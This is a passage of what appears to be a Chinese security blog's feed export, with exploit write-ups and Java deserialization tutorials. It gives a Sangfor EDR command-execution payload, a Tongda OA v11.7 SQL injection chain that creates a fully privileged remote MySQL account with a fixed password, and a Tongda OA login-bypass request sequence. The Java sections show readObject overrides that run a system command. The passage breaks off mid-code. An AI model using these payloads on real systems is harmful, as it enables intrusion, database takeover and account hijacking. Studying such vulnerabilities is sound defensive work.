<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage.png">img</a></p>
<p>使用了匿名函数，use调用了外部变量$strip_slashes、$show_input</p>
<p>extract()函数会从数组中将变量导入到当前的符号表。他会把数组变成变量，函数使用数组的键名为变量名，键值为变量值</p>
<p>$host是如果存在就执行$strip_slashes($host)</p>
<p>那么传参数的时候使用:strip_slashes=system&amp;host=id</p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154517340.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909154517340.png" alt="img"></a></p>
<p><a href="https://b0u4ne.github.io/2020/09/09/深信服edr漏洞分析/getImage-20200909154517340.png">img</a></p>
<p>strip_slashes函数的作用是去掉&amp;变量中的\</p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>sangfor</tag>
        <tag>EDR</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA v11.7 后台SQL注入</title>
    <url>/2020/09/17/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>需要登录权限</p>
<p>原文作者给出了利用链注入加mysql权限，又是写木马的。用起来很舒服</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;select%20if((substr(user(),1,1)&#x3D;%27r%27),1,power(9999,99))</span><br></pre></td></tr></table></figure>

<a id="more"></a>

<p>1、添加一个mysql用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200917165121752.png" alt="image-20200917165121752"></p>
<p>2、给创建的ateam666账户添加mysql权限。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE &#96;mysql&#96;.&#96;user&#96; SET &#96;Password&#96; &#x3D; &#39;*DE0742FA79F6754E99FDB9C8D2911226A5A9051D&#39;, &#96;Select_priv&#96; &#x3D; &#39;Y&#39;, &#96;Insert_priv&#96; &#x3D; &#39;Y&#39;, &#96;Update_priv&#96; &#x3D; &#39;Y&#39;, &#96;Delete_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_priv&#96; &#x3D; &#39;Y&#39;, &#96;Drop_priv&#96; &#x3D; &#39;Y&#39;, &#96;Reload_priv&#96; &#x3D; &#39;Y&#39;, &#96;Shutdown_priv&#96; &#x3D; &#39;Y&#39;, &#96;Process_priv&#96; &#x3D; &#39;Y&#39;, &#96;File_priv&#96; &#x3D; &#39;Y&#39;, &#96;Grant_priv&#96; &#x3D; &#39;Y&#39;, &#96;References_priv&#96; &#x3D; &#39;Y&#39;, &#96;Index_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_db_priv&#96; &#x3D; &#39;Y&#39;, &#96;Super_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tmp_table_priv&#96; &#x3D; &#39;Y&#39;, &#96;Lock_tables_priv&#96; &#x3D; &#39;Y&#39;, &#96;Execute_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_slave_priv&#96; &#x3D; &#39;Y&#39;, &#96;Repl_client_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Show_view_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Alter_routine_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_user_priv&#96; &#x3D; &#39;Y&#39;, &#96;Event_priv&#96; &#x3D; &#39;Y&#39;, &#96;Trigger_priv&#96; &#x3D; &#39;Y&#39;, &#96;Create_tablespace_priv&#96; &#x3D; &#39;Y&#39;, &#96;ssl_type&#96; &#x3D; &#39;&#39;, &#96;ssl_cipher&#96; &#x3D; &#39;&#39;, &#96;x509_issuer&#96; &#x3D; &#39;&#39;, &#96;x509_subject&#96; &#x3D; &#39;&#39;, &#96;max_questions&#96; &#x3D; 0, &#96;max_updates&#96; &#x3D; 0, &#96;max_connections&#96; &#x3D; 0, &#96;max_user_connections&#96; &#x3D; 0, &#96;plugin&#96; &#x3D; &#39;mysql_native_password&#39;, &#96;authentication_string&#96; &#x3D; &#39;&#39;, &#96;password_expired&#96; &#x3D; &#39;Y&#39; WHERE &#96;Host&#96; &#x3D; Cast(&#39;%&#39; AS Binary(1)) AND &#96;User&#96; &#x3D; Cast(&#39;ateam666&#39; AS Binary(5));</span><br></pre></td></tr></table></figure>

<p>3、刷新数据库就可以登录到数据库啦。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;flush privileges;</span><br></pre></td></tr></table></figure>

<p>4、通达OA配置mysql默认是不开启外网访问的所以需要修改mysql授权登录。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;general&#x2F;hr&#x2F;manage&#x2F;query&#x2F;delete_cascade.php?condition_cascade&#x3D;</span><br><span class="line"></span><br><span class="line">grant all privileges ON mysql.* TO &#39;ateam666&#39;@&#39;%&#39; IDENTIFIED BY &#39;abcABC@123&#39; WITH GRANT OPTION</span><br></pre></td></tr></table></figure>

<p>5、接下来就是考验mysql提权功底的时候啦 </p>
<p>参考链接：<a href="https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw">https://mp.weixin.qq.com/s/8rvIT1y_odN2obJ1yAvLbw</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>通达OA任意用户登陆</title>
    <url>/2020/09/15/WEB/Exploit/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86/</url>
    <content><![CDATA[<p>1、首先访问 /ispirit/login_code.php 获取 codeuid。</p>
<p>2、访问 /general/login_code_scan.php 提交 post 参数：</p>
<p>uid=1&amp;codeuid={9E908086-342B-2A87-B0E9-E573E226302A}</p>
<a id="more"></a>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095052094.png" alt="image-20200915095052094"></p>
<p>然后构造数据包请求/logincheck_code.php 得到cookie</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200915095153086.png" alt="image-20200915095153086"></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞学习实践一-从Serializbale接口开始先弹一个计算器</title>
    <url>/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%80-%E4%BB%8ESerializbale%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E5%85%88%E5%BC%B9%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
    <content><![CDATA[<h3 id="0x0、基本概念"><a href="#0x0、基本概念" class="headerlink" title="0x0、基本概念"></a>0x0、基本概念</h3><p><strong>1、什么是序列化和反序列化</strong></p>
<p>Serialization（序列化）是指把Java对象保存为二进制字节码的过程；反序列化deserialization是把二进制码重新转换成Java对象的过程。</p>
<p><strong>2、什么情况下需要序列化</strong></p>
<p>a）当你想把的内存中的对象保存到一个文件中或者数据库中时候；</p>
<p>b）当你想用套接字在网络上传送对象的时候；</p>
<p>c）当你想通过RMI传输对象的时候；</p>
<p>总之，序列化的用途就是传递和存储。</p>
<p><strong>3、如何实现序列化</strong></p>
<p>将需要序列化的类实现Serializable接口就可以了，Serializable接口中没有任何方法，可以理解为一个标记，即表明这个类可以被序列化。</p>
<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过如下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
 <a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"> * 写入对象内容</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">private void writeObject(java.io.ObjectOutputStream out)</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"> * 读取对象内容</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream in)﻿</span><br></pre></td></tr></table></figure>

<p><strong>4、一些注意点</strong></p>
<p>当然，并不是一个实现了序列化接口的类的所有字段及属性，都是可以序列化的：</p>
<p>如果该类有父类，则分两种情况来考虑：</p>
<p>1.如果该父类已经实现了可序列化接口，则其父类的相应字段及属性的处理和该类相同；</p>
<p>2.如果该类的父类没有实现可序列化接口，则该类的父类所有的字段属性将不会序列化，并且反序列化时会调用父类的默认构造函数来初始化父类的属性，而子类却不调用默认构造函数，而是直接从流中恢复属性的值。</p>
<p>如果该类的某个属性标识为static类型的，则该属性不能序列化。</p>
<p>如果该类的某个属性采用transient关键字标识，则该属性不能序列化。</p>
<p>a）当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口；</p>
<p>b）当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化；</p>
<h3 id="0x1、简单实例"><a href="#0x1、简单实例" class="headerlink" title="0x1、简单实例"></a>0x1、简单实例</h3><p>以下代码是一个简单的序列化和反序列化操作的demo。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class deserTest implements Serializable &#123;	</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public deserTest(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;deserTest [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			deserTest x &#x3D; new deserTest(5);</span><br><span class="line">			operation.ser(x);</span><br><span class="line">			operation.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014255836.png" alt="img"></p>
<h3 id="0x2、自定义反序列化的行为–弹个计算器"><a href="#0x2、自定义反序列化的行为–弹个计算器" class="headerlink" title="0x2、自定义反序列化的行为–弹个计算器"></a>0x2、自定义反序列化的行为–弹个计算器</h3><p>自定义序列化和反序列化过程，就是重写writeObject和readObject方法。</p>
<p>对以上代码进行改造，加入readObject方法的重写，再重写函数中加入自己的代码逻辑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class deserTest2 implements Serializable &#123;	</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public deserTest2(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;deserTest2 [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">		in.defaultReadObject();</span><br><span class="line">		Runtime.getRuntime().exec(&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">		System.out.println(&quot;test&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			deserTest2 x &#x3D; new deserTest2(5);</span><br><span class="line">			operation1.ser(x);</span><br><span class="line">			operation1.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation1&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>







<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014255733.png" alt="img"></p>
<p>总结：</p>
<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中。但是一般会有其他的代码逻辑，如果它的代码逻辑里，如果有某一个分支有像method.invoke()这种可以调用其他函数的代码，那么就可以跳转过去，再从这个“其他函数”的角度去看有没有执行代码或调用其他函数的可能。这个“其他函数”也就是所谓的gadget了。</p>
<p>参考：</p>
<p><a href="http://www.cnblogs.com/xdp-gacl/p/3777987.html">http://www.cnblogs.com/xdp-gacl/p/3777987.html</a></p>
<p><a href="http://www.importnew.com/20125.html">http://www.importnew.com/20125.html</a></p>
<p><a href="http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua">http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞学习实践二-Java的反射机制（Java Reflection）</title>
    <url>/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C-Java%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java-Reflection%EF%BC%89/</url>
    <content><![CDATA[<p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<a id="more"></a>

<h3 id="0x0、基础"><a href="#0x0、基础" class="headerlink" title="0x0、基础"></a>0x0、基础</h3><p><strong>Java反射机制</strong></p>
<ul>
<li>指的是可以于运行时加载,探知和使用编译期间完全未知的类.</li>
<li>程序在运行状态中, 可以动态加载一个只有名称的类, 对于任意一个已经加载的类,都能够知道这个类的所有属性和方法; 对于任意一个对象,都能调用他的任意一个方法和属性;</li>
<li>加载完类之后, 在堆内存中会产生一个Class类型的对象(一个类只有一个Class对象), 这个对象包含了完整的类的结构信息,而且这个Class对象就像一面镜子,透过这个镜子看到类的结构,所以被称之为:反射.</li>
<li>每个类被加载进入内存之后,系统就会为该类生成一个对应的java.lang.Class对象,通过该Class对象就可以访问到JVM中的这个类.</li>
</ul>
<p><strong>Class对象的获取方法</strong></p>
<ul>
<li>实例对象的getClass()方法;</li>
<li>类的.class(最安全/性能最好)属性;（如demo代码和下图）</li>
<li>运用Class.forName(String className)动态加载类,className需要是类的全限定名(最常用).</li>
</ul>
<p>注意，有一点很有趣，使用功能”.class”来创建Class对象的引用时，不会自动初始化该Class对象，使用forName()会自动初始化该Class对象</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014329604.png" alt="img"></p>
<h3 id="0x1、通过反射方法调用函数"><a href="#0x1、通过反射方法调用函数" class="headerlink" title="0x1、通过反射方法调用函数"></a>0x1、通过反射方法调用函数</h3><p>该demo主要实践学习使用反射方法来调用类中的函数。</p>
<p>``</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class reflectionTest &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		try&#123;</span><br><span class="line">			&#x2F;&#x2F;Class 获取类的方法一：事例化对象的getclass()方法；</span><br><span class="line">			User testObject &#x3D; new User(&quot;zhangsan&quot;,19);</span><br><span class="line">			Class Method1Class &#x3D; testObject.getClass();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F;Class获取类的方法二：类的.Class(最安全&#x2F;性能最好)属性;有点类似python的getattr()。java中每个类型都有class属性。</span><br><span class="line">			Class method2Class &#x3D; User.class;</span><br><span class="line">		</span><br><span class="line">			&#x2F;&#x2F;Class对象的获取方法三：运用Class.forName(String className)动态加载类，className需要是类的全限定名（最常用）</span><br><span class="line">			&#x2F;&#x2F;这种方法也最容易理解，通过类名（jar包中的完整namespace）就可以调用其中方法，也最符合我们需要的使用场景</span><br><span class="line">			&#x2F;&#x2F;j2eeScan burp 插件就使用了这种反射机制</span><br><span class="line">			String path &#x3D; &quot;反序列化2.User&quot;;</span><br><span class="line">			Class method3Class &#x3D; Class.forName(path);</span><br><span class="line">			</span><br><span class="line">			Method[] methods &#x3D; method3Class.getMethods();</span><br><span class="line">			 </span><br><span class="line">			&#x2F;&#x2F;通过类的class属性获取对应的Class类的对象，通过这个Class类的对象获取test类中的方法集合</span><br><span class="line">		</span><br><span class="line">		    &#x2F;* String name &#x3D; Method3Class.getName();</span><br><span class="line">		     * int modifiers &#x3D; Method3Class.getModifiers();</span><br><span class="line">		     * .....还有很多方法</span><br><span class="line">		     * 也就是说，对于一个任意的可以访问到的类，我们都能够通过以上这些方法来知道它的所有的方法和属性；</span><br><span class="line">		     * 知道了它的方法和属性，就可以调用这些方法和属性。</span><br><span class="line">		     *&#x2F;</span><br><span class="line">		</span><br><span class="line">		    &#x2F;&#x2F;调用User类中的方法</span><br><span class="line">			</span><br><span class="line">			for(Method method: methods) &#123;</span><br><span class="line">				if(method.getName().equals(&quot;getName&quot;)) &#123;</span><br><span class="line">					System.out.println(&quot;method &#x3D; &quot; + method.getName());</span><br><span class="line">					Class[] parameterTypes &#x3D; method.getParameterTypes(); &#x2F;&#x2F;获取方法的参数</span><br><span class="line">					Class returnType &#x3D; method.getReturnType(); &#x2F;&#x2F;获取方法的返回类型</span><br><span class="line">					try &#123;</span><br><span class="line">						User user &#x3D; (User)method3Class.newInstance();</span><br><span class="line">						Object x  &#x3D; method.invoke(user);  &#x2F;&#x2F;user.getName;</span><br><span class="line">						&#x2F;&#x2F;Object x &#x3D; method.invoke(new test(1), 666);</span><br><span class="line">			            &#x2F;&#x2F;new关键字能调用任何构造方法,newInstance()只能调用无参构造方法。但反射的场景中是不应该有机会使用new关键词的。</span><br><span class="line">			            System.out.println(x);</span><br><span class="line">					&#125; catch (Exception e) &#123;</span><br><span class="line">						&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">						e.printStackTrace();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			Method method1 &#x3D; method3Class.getMethod(&quot;setName&quot;, String.class);</span><br><span class="line">			User user1 &#x3D; (User)method3Class.getConstructor(String.class,Integer.class).newInstance(&quot;lisi&quot;,19);</span><br><span class="line">			&#x2F;&#x2F;调用自定义构造器的方法</span><br><span class="line">			Object x &#x3D; method1.invoke(user1, &quot;李四&quot;);&#x2F;&#x2F;第一个参数是类的对象。第二个参数是函数的参数</span><br><span class="line">			System.out.println(user1.getName());</span><br><span class="line">			&#125;catch(Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">	private Integer age;</span><br><span class="line">	private String name;</span><br><span class="line">	</span><br><span class="line">	public User() &#123;&#125;;</span><br><span class="line">	public User(String name,Integer age) &#123;</span><br><span class="line">		this.age &#x3D; age;</span><br><span class="line">		this.name &#x3D; name;</span><br><span class="line">	&#125;</span><br><span class="line">	public Integer getAge() &#123;</span><br><span class="line">		return age;</span><br><span class="line">	&#125;</span><br><span class="line">	public void setAge(Integer age) &#123;</span><br><span class="line">		this.age &#x3D; age;</span><br><span class="line">	&#125;</span><br><span class="line">	public String getName() &#123;</span><br><span class="line">		return name;</span><br><span class="line">	&#125;</span><br><span class="line">	public void setName(String name) &#123;</span><br><span class="line">		this.name &#x3D; name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>

<p><img src="https://leanote.com/api/file/getImage?fileId=5f34e912ab644156ad000813" alt="img"></p>
<h3 id="0x2、通过反射方法弹个计算器"><a href="#0x2、通过反射方法弹个计算器" class="headerlink" title="0x2、通过反射方法弹个计算器"></a>0x2、通过反射方法弹个计算器</h3><p>step1中，我们通过重写readObject方法，直接在里面使用Runtime.getRuntime().exec(“calc.exe”)来执行代码。现在需要改造一下，使用反弹方法来实现，成功调试的代码如下。<code>1</code>1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class reflectionTest2 implements Serializable&#123;</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public reflectionTest2(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;reflectionTest2 [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			Method method &#x3D; java.lang.Runtime.class.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">			Object result &#x3D; method.invoke(Runtime.getRuntime(), &quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			reflectionTest2 x &#x3D; new reflectionTest2(5);</span><br><span class="line">			operation.ser(x);</span><br><span class="line">			operation.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) 